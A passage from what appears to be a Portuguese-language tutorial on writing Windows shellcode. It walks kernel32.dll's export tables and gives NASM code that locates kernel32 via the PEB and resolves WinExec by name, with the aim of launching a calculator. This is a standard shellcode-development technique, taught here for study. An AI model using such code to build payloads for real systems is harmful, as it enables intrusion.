data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718105822.png" alt="" /></p><p>Este RVA corresponde ao <code class="language-plaintext highlighter-rouge">IMAGE_EXPORT_DIRECTORY</code> que pode ser acessado navegando para <code class="language-plaintext highlighter-rouge">SECTION .rdata-&gt;IMAGE_EXPORT_DIRECTORY</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718110507.png" alt="" /></p><p>O IMAGE_EXPORT_DIRECTORY é responsável por armazenar todas as informações relacionadas as funções em uma DLL. Entre suas entradas, 3 são importantes em nosso contexto:</p><ul><li><strong>RVA 93e0c (93df0 + 0x1c)</strong> - <em>Address Table RVA</em> que contém <code class="language-plaintext highlighter-rouge">93e18</code> que é o RVA da <code class="language-plaintext highlighter-rouge">EXPORT Address Table</code> (Na imagem abaixo);<li><strong>RVA 93e10 (93df0 + 0x20)</strong> - <em>Name Pointer Table RVA</em> que contém <code class="language-plaintext highlighter-rouge">957c4</code> que é o RVA da <code class="language-plaintext highlighter-rouge">EXPORT Name Pointer Table</code> (Na imagem abaixo);<li><strong>RVA 93e14 (93df0 + 0x24)</strong> - <em>Ordinal Table RVA</em> que contém <code class="language-plaintext highlighter-rouge">97170</code> que é o RVA da <code class="language-plaintext highlighter-rouge">EXPORT Ordinal Table</code> (Na imagem abaixo).</ul><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718132652.png" alt="EXPORT Address Table" /></p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718132752.png" alt="EXPORT Name Pointer Table" /></p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718132828.png" alt="EXPORT Ordinal Table" /></p><p>De forma simplificada, estas tabelas são:</p><ul><li><strong><em>EXPORT Address Table</em></strong> - Contém RVAs que por sua vez armazenam outros RVAs que apontam para todos os símbolos/funções na kernel32.dll;<li><strong><em>ERXPORT Name Pointer Table</em></strong> - Aponta para os nomes (<em>strings</em>) dos símbolos/funções na kernel32.dll e o valor ordinal final de cada um;<li><strong><em>EXPORT Ordinal Table</em></strong> - Contém o valor ordinal inicial de cada símbolo/função (que sempre será igual ao valor ordinal final -1).</ul><p>Uma vez que sabemos que a <strong><em>EXPORT Address Table</em></strong> armazena os RVAs das funções, podemos até mesmo encontrar manualmente a função <code class="language-plaintext highlighter-rouge">WinExec()</code> dentro dela.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718144004.png" alt="" /></p><p>Assim como se procurarmos a função na <strong><em>ERXPORT Name Pointer Table</em></strong>, encontraremos seu valor ordinal final que é <code class="language-plaintext highlighter-rouge">0x0629</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718144611.png" alt="" /></p><p>Até este ponto, uma boa caminhada foi feita na estrutura da kernel32.dll, e o mais importante é que tudo que enumeramos foram RVAs, ou seja, <em>offsets</em> de endereços, e não endereços absolutos. O que significa que o processo para encontrar estes <em>offsets</em> será replicável para todas as atualizações do Windows 11 (utilizado no estudo). Porém, fizemos tudo isso “na mão”, o que não é replicável em um ataque real, pois em muitas das vezes o <em>shellcode</em> é feito antes do acesso inicial ao alvo.</p><p>O próximo passo, é mapear a forma de encontrar o endereço da função <code class="language-plaintext highlighter-rouge">WinExec()</code> dentro da <code class="language-plaintext highlighter-rouge">EXPORT Address Table</code>, para isso, vamos enumerar os passos contando com o que já temos.</p><ol><li>Encontrar o RVA do <em>offset</em> do cabeçalho EXE - já temos = <code class="language-plaintext highlighter-rouge">0x3c</code>;<li>Encontrar o RVA da <code class="language-plaintext highlighter-rouge">Export Table</code> - já temos 170 - f8 (início do cabeçalho do PE) = <code class="language-plaintext highlighter-rouge">0x78</code>;<li>Encontrar o RVA da <code class="language-plaintext highlighter-rouge">IMAGE_EXPORT_DIRECTORY</code> - já temos = <code class="language-plaintext highlighter-rouge">0x93df0</code> contido no RVA da <code class="language-plaintext highlighter-rouge">Export Table</code>;<li>Encontrar o RVA da <code class="language-plaintext highlighter-rouge">EXPORT Address Table</code> - já temos = <code class="language-plaintext highlighter-rouge">0x93e18</code> (conteúdo de <code class="language-plaintext highlighter-rouge">0x93df0 + 0x1c</code>) ;<li>Encontrar o RVA de <code class="language-plaintext highlighter-rouge">EXPORT Name Pointer</code> - já temos = <code class="language-plaintext highlighter-rouge">0x957c4</code> (conteúdo de <code class="language-plaintext highlighter-rouge">0x93df0 + 0x20</code>);<li>Encontrar o valor ordinal final da <code class="language-plaintext highlighter-rouge">WinExec()</code> na <code class="language-plaintext highlighter-rouge">EXPORT Name Pointer Table</code>, podemos fazer isso usando um <em>loop</em> comparando <em>strings</em> - já temos manualmente = <code class="language-plaintext highlighter-rouge">0x0629</code>;<li>Subtrair <strong>1</strong> do valor ordinal final da <code class="language-plaintext highlighter-rouge">WinExec()</code> para encontrar o valor ordinal inicial - já temos manualmente = <code class="language-plaintext highlighter-rouge">0x0628</code> = <code class="language-plaintext highlighter-rouge">0x0629 - 1</code>;<li>Somar ao RVA da <code class="language-plaintext highlighter-rouge">EXPORT Address Table</code> (valor ordinal inicial * tamanho do endereço (4 bytes)) - já temos manualmente <code class="language-plaintext highlighter-rouge">0x93e18 + 0x0628 * 4</code> = <code class="language-plaintext highlighter-rouge">0x956B8</code>;<li>Capturar o conteúdo da RVA encontrada no passo 8 (<code class="language-plaintext highlighter-rouge">0x65140</code>) e somar ao endereço base da kernel32.dll - já temos manualmente = 0x75765140 = <code class="language-plaintext highlighter-rouge">0x75700000 + 0x65140</code>;</ol><p>Se compararmos aos valores obtidos com o programa getaddr.exe, chegamos exatamente nos valores corretos, e tudo isso com matemática de <em>offsets</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>kernel32.dll - 0x75700000
WinExec      - 0x75765140
</pre></table></code></div></div><h3 id="desenvolvendo-o-shellcode-exemplo-1---invocando-a-calculadora">Desenvolvendo o <em>shellcode</em>, Exemplo 1 - Invocando a Calculadora</h3><p>Seguindo o fluxo para invocar a função, vimos que a partir do passo <strong>6</strong> não temos uma forma automatizada de encontrar os endereços, tivemos a facilidade de procurar manualmente, mas se uma atualização alterar o ordinal da função, o <em>shellcode</em> deixa de funcionar. Portanto, vamos escrever um programa, que fará um <em>loop</em> na <code class="language-plaintext highlighter-rouge">EXPORT Name Pointer Table</code> a procura da <em>string</em> que contenha o nome da função desejada passando por cada ordinal de forma incremental.</p><p>Primeiramente, precisamos enviar o nome da função a ser procurada na <em>stack</em>, ela precisa estar em hexadecimal e em ordem inversa (<em>little endian</em>) separada a cada 8 bytes. Usaremos o programa em Go que utilizamos anteriormente.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718161649.png" alt="" /></p><p>Temos os seguintes valores:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>0x4e636578
0x456e6957
</pre></table></code></div></div><p>Note que o “N” inserido ao final, serve somente para completar os 8 bytes, no programa ASM trataremos este caractere.</p><p>Este trecho abaixo, fará a procura do endereço da função utilizando os 9 passos listados acima, muita atenção, pois é a continuação do programa que procura o endereço base da kernel32.dll, portanto ele conta com que o endereço base da kernel32.dll já esteja armazenado em <code class="language-plaintext highlighter-rouge">eax</code>.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>    <span class="c1">;enviando nome da função para stack</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>                <span class="c1">;zerando o registrador</span>
    <span class="nf">push</span> <span class="mh">0x4e636578</span>             <span class="c1">;movendo Ncex para stack</span>
    <span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">],</span> <span class="mh">0x4e</span>  <span class="c1">;removendo o "N"</span>
    <span class="nf">push</span> <span class="mh">0x456e6957</span>             <span class="c1">;movendo EniW para stack</span>
    <span class="c1">;encontrando o endereço da Export Table e armazenando em edx</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">]</span>       <span class="c1">;conteudo de 0x3c é f8 e foi movido para edx</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">;adicionado o endereço base da kernel32 a f8, edx = 0x757000f8</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">]</span>       <span class="c1">;adicionado 0x78 (170 - f8) para obter o RVA de Image Export Directory, edx = 0x93df0</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Image Export Directory, edx = 0x75793df0</span>
    <span class="c1">;encontrando o endereço da Export Name Pointer table e armazenando em ecx</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span>       <span class="c1">;adicionadno 0x20 a 0x75793df0 para obter o RVA da Export Name Pointer Table, ecx = 0x957c4</span>
    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Export Name Pointer Table, ecx = 0x757957c4</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">],</span> <span class="nb">ecx</span>            <span class="c1">;movendo o endereço base de Export Name Pointer Table para a variavel [ebp-4]</span>
    <span class="c1">;encontrando o endereço de Export Address table e armazenando em edx</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">]</span>       <span class="c1">;adicionando 0x1c a 0x75793df0 para obter o RVA da Export Address Table, edx = 0x93e18</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Export Address Table, edx = 0x75793e18</span>

<span class="c1">;encontrando o endereço da WinExec na kernel32.dll com loop</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>                    <span class="c1">;zerando o registrador para uso no loop</span>
<span class="nl">findproc:</span>

    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>            <span class="c1">;zerando o registrador para ser usado em comparações de string</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">;movendo WinExec da stack para esi</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>        <span class="c1">;movendo o endereço base da Export Name Pointer Table para edi, edi = 0x757957c4</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">edi</span> <span class="o">+</span> <span class="nb">ebx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="c1">;endereço base da Export Name Pointer Table + valor ordinal * 4, edi = RVA do função buscada pelo nome</span>
    <span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">;adicionando o endereço base da kernel32 ao RVA da função</span>
    <span class="nf">add</span> <span class="nb">cx</span><span class="p">,</span> <span class="mi">4</span>               <span class="c1">;movendo o comprimento da string WinExec para cx: WinExec = 7 bytes = 4 WORD</span>
    <span class="nf">repe</span> <span class="nv">cmpsw</span>              <span class="c1">;compara o numero de WORDS no registrador cx da esquerda para direita com edi e esi, armazena a saída na flag ZF</span>
    <span class="nf">jz</span> <span class="nv">findaddr</span>             <span class="c1">;pula para findaddr e quebra o loop se a flag ZE for TRUE</span>
    <span class="nf">inc</span> <span class="nb">ebx</span>                 <span class="c1">;incrementa o contador que contém o ordinal</span>
    <span class="nf">loop</span> <span class="nv">findproc</span>           <span class="c1">;loop no findproc</span>
<span class="nl">findaddr:</span>
</pre></table></code></div></div><p>Adicionando este trecho ao anterior, temos o código:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">;zerando o registrador</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">fs</span><span class="p">:</span><span class="mh">0x30</span><span class="p">]</span>      <span class="c1">;movendo o offset da PEB de fs (File Segment) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x0c</span><span class="p">]</span>   <span class="c1">;movendo o offset da LDR (PEB + 0x00c) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">]</span>   <span class="c1">;movendo o offset da InMemoryOrderModuleList (LDR + 0x014) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>          <span class="c1">;carregando o endereço efetivo do primeiro modulo - o executavel em si</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>          <span class="c1">;carregando o endereço efetivo do segundo modulo - ntdll.dll</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>   <span class="c1">;carregando o endereço base do terceiro modulo - kernel32.dll</span>

    <span class="c1">;enviando nome da função para stack</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>                <span class="c1">;zerando o registrador</span>
    <span class="nf">push</span> <span class="mh">0x4e636578</span>             <span class="c1">;movendo Ncex para stack</span>
    <span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">],</span> <span class="mh">0x4e</span>  <span class="c1">;removendo o "N"</span>
    <span class="nf">push</span> <span class="mh">0x456e6957</span>             <span class="c1">;movendo EniW para stack</span>
    <span class="c1">;encontrando o endereço da Export Table e armazenando em edx</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">]</span>       <span class="c1">;conteudo de 0x3c é f8 e foi movido para edx</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">;adicionado o endereço base da kernel32 a f8, edx = 0x757000f8</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">]</span>       <span class="c1">;adicionado 0x78 (170 - f8) para obter o RVA de Image Export Directory, edx = 0x93df0</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Image Export Directory, edx = 0x75793df0</span>
    <span class="c1">;encontrando o endereço da Export Name Pointer table e armazenando em ecx</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span>       <span class="c1">;adicionadno 0x20 a 0x75793df0 para obter o RVA da Export Name Pointer Table, ecx = 0x957c4</span>
    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Export Name Pointer Table, ecx = 0x757957c4</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">],</span> <span class="nb">ecx</span>            <span class="c1">;movendo o endereço base de Export Name Pointer Table para a variavel [ebp-4]</span>
    <span class="c1">;encontrando o endereço de Export Address table e armazenando em edx</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">]</span>       <span class="c1">;adicionando 0x1c a 0x75793df0 para obter o RVA da Export Address Table, edx = 0x93e18</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Export Address Table, edx = 0x75793e18</span>

<span class="c1">;encontrando o endereço da WinExec na kernel32.dll com loop</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>                    <span class="c1">;zerando o registrador para uso no loop</span>
<span class="nl">findproc:</span>

    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>            <span class="c1">;zerando o registrador para ser usado em comparações de string</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">;movendo WinExec da stack para esi</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>        <span class="c1">;movendo o endereço base da Export Name Pointer Table para edi, edi = 0x757957c4</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">edi</span> <span class="o">+</span> <span class="nb">ebx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="c1">;endereço base da Export Name Pointer Table + valor ordinal * 4, edi = RVA do função buscada pelo nome</span>
    <span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">;adicionando o endereço base da kernel32 ao RVA da função</span>
    <span class="nf">add</span> <span class="nb">cx</span><span class="p">,</span> <span class="mi">4</span>               <span class="c1">;movendo o comprimento da string WinExec para cx: WinExec = 7 bytes = 4 WORD</span>
    <span class="nf">repe</span> <span class="nv">cmpsw</span>              <span class="c1">;compara o numero de WORDS no registrador cx da esquerda para direita com edi e esi, armazena a saída na flag ZF</span>
    <span class="nf">jz</span> <span class="nv">findaddr</span>             <span class="c1">;pula para findaddr e quebra o loop se a flag ZE for TRUE</span>
    <span class="nf">inc</span> <span class="nb">ebx</span>                 <span class="c1">;incrementa o contador que contém o ordinal</span>
    <span class="nf">loop</span> <span class="nv">findproc</span>           <span class="c1">;loop no findproc</span>
<span class="nl">findaddr:</span>
</pre></table></code></div></div><p>Podemos compilar o programa no Windows:</p><pre><code class="language-cmd">&gt; nasm -f win32 searchfunction.asm
&gt; ld -m i386pe searchfunction.obj -o searchfunction.exe
</code></pre><p>Se executarmos o programa no <code class="language-plaintext highlighter-rouge">x32dbg</code> veremos a seguinte inconsistência:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718185014.png" alt="" /></p><p>O valor de <code class="language-plaintext highlighter-rouge">ebx</code> que foi utilizado para fazer o <em>loop</em> é <code class="language-plaintext highlighter-rouge">627</code> quando precisava ser <code class="language-plaintext highlighter-rouge">628</code> que é o valor ordinal inicial da função <code class="language-plaintext highlighter-rouge">WinExec</code>. Para entendermos este comportamento inconsistente, vamos analisar novamente duas tabelas.</p><p>Se olharmos para a <code class="language-plaintext highlighter-rouge">Export Ordinal Table</code> veremos que seu valor ordinal começa em <code class="language-plaintext highlighter-rouge">004 AcquireSRWLockExclusive</code> e continua sendo incrementado de 1 em 1 para cada função:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718185347.png" alt="" /></p><p>Então, se rolarmos até encontrar a função <code class="language-plaintext highlighter-rouge">WinExec</code>, veremos que seu valor ordinal final é <code class="language-plaintext highlighter-rouge">0629</code> e o inicial <code class="language-plaintext highlighter-rouge">0628</code>:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718185702.png" alt="" /></p><p>Em tese, poderíamos resolver este problema, se o nosso contador em <code class="language-plaintext highlighter-rouge">ebx</code> começasse em 4 e fosse incrementado a partir daí, mas isso só funcionaria se os valores ordinais estivessem em ordem cronológica em <strong>todas</strong> as tabelas. Na <code class="language-plaintext highlighter-rouge">EXPORT Ordinal Table</code> os valores ordinais começam em <strong>4</strong>, já na <code class="language-plaintext highlighter-rouge">EXPORT Address Table</code> eles começam em <strong>1</strong>:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718190228.png" alt="" /></p><p>Se analisarmos a <code class="language-plaintext highlighter-rouge">EXPORT Ordinal Table</code> em busca dos 3 primeiros valores da <code class="language-plaintext highlighter-rouge">EXPORT Address Table</code> (<code class="language-plaintext highlighter-rouge">BaseThreadInitThunk, InterlockedPushListSList</code> e <code class="language-plaintext highlighter-rouge">Wow64Transition</code>), veremos que eles foram inseridos por ordem alfabética e não por ordinal:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718190543.png" alt="" /></p><p>E é exatamente por este motivo que a <code class="language-plaintext highlighter-rouge">EXPORT Ordinal Table</code> começa em <code class="language-plaintext highlighter-rouge">004</code> e não em <code class="language-plaintext highlighter-rouge">001</code>, portanto nosso contador precisa de um ajuste.</p><p>Para corrigir o problema usaremos o mesmo <em>loop</em> do programa, e uma vez que a <em>string</em> for encontrada em <code class="language-plaintext highlighter-rouge">EXPORT Ordinal Table</code>, simplesmente corrigiremos adicionando 1 ou 2 inteiros, no nosso caso será 1. Então o código completo fica:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">;zerando o registrador</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">fs</span><span class="p">:</span><span class="mh">0x30</span><span class="p">]</span>      <span class="c1">;movendo o offset da PEB de fs (File Segment) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x0c</span><span class="p">]</span>   <span class="c1">;movendo o offset da LDR (PEB + 0x00c) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">]</span>   <span class="c1">;movendo o offset da InMemoryOrderModuleList (LDR + 0x014) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>          <span class="c1">;carregando o endereço efetivo do primeiro modulo - o executavel em si</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>          <span class="c1">;carregando o endereço efetivo do segundo modulo - ntdll.dll</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>   <span class="c1">;carregando o endereço base do terceiro modulo - kernel32.dll</span>

    <span class="c1">;enviando nome da função para stack</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>                <span class="c1">;zerando o registrador</span>
    <span class="nf">push</span> <span class="mh">0x4e636578</span>             <span class="c1">;movendo Ncex para stack</span>
    <span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">],</span> <span class="mh">0x4e</span>  <span class="c1">;removendo o "N"</span>
    <span class="nf">push</span> <span class="mh">0x456e6957</span>             <span class="c1">;movendo EniW para stack</span>
    <span class="c1">;encontrando o endereço da Export Table e armazenando em edx</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">]</span>       <span class="c1">;conteudo de 0x3c é f8 e foi movido para edx</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">;adicionado o endereço base da kernel32 a f8, edx = 0x757000f8</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">]</span>       <span class="c1">;adicionado 0x78 (170 - f8) para obter o RVA de Image Export Directory, edx = 0x93df0</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Image Export Directory, edx = 0x75793df0</span>
    <span class="c1">;encontrando o endereço da Export Name Pointer table e armazenando em ecx</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span>       <span class="c1">;adicionadno 0x20 a 0x75793df0 para obter o RVA da Export Name Pointer Table, ecx = 0x957c4</span>
    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Export Name Pointer Table, ecx = 0x757957c4</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">],</span> <span class="nb">ecx</span>            <span class="c1">;movendo o endereço base de Export Name Pointer Table para a variavel [ebp-4]</span>
    <span class="c1">;encontrando o endereço de Export Address table e armazenando em edx</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">]</span>       <span class="c1">;adicionando 0x1c a 0x75793df0 para obter o RVA da Export Address Table, edx = 0x93e18</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Export Address Table, edx = 0x75793e18</span>

<span class="c1">;encontrando o endereço da WinExec na kernel32.dll com loop</span>
        <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>                    <span class="c1">;zerando o registrador para uso no loop</span>
<span class="nl">findproc:</span>

    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>            <span class="c1">;zerando o registrador para ser usado em comparações de string</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">;movendo WinExec da stack para esi</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>        <span class="c1">;movendo o endereço base da Export Name Pointer Table para edi, edi = 0x757957c4</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">edi</span> <span class="o">+</span> <span class="nb">ebx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="c1">;endereço base da Export Name Pointer Table + valor ordinal * 4, edi = RVA do função buscada pelo nome</span>
    <span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">;adicionando o endereço base da kernel32 ao RVA da função</span>
    <span class="nf">add</span> <span class="nb">cx</span><span class="p">,</span> <span class="mi">4</span>               <span class="c1">;movendo o comprimento da string WinExec para cx: WinExec = 7 bytes = 4 WORD</span>
    <span class="nf">repe</span> <span class="nv">cmpsw</span>              <span class="c1">;compara o numero de WORDS no registrador cx da esquerda para direita com edi e esi, armazena a saída na flag ZF</span>
    <span class="nf">jz</span> <span class="nv">findaddr</span>             <span class="c1">;pula para findaddr e quebra o loop se a flag ZE for TRUE</span>
    <span class="nf">inc</span> <span class="nb">ebx</span>                 <span class="c1">;incrementa o contador que contém o ordinal</span>
    <span class="nf">loop</span> <span class="nv">findproc</span>           <span class="c1">;loop no findproc</span>
<span class="nl">findaddr:</span>

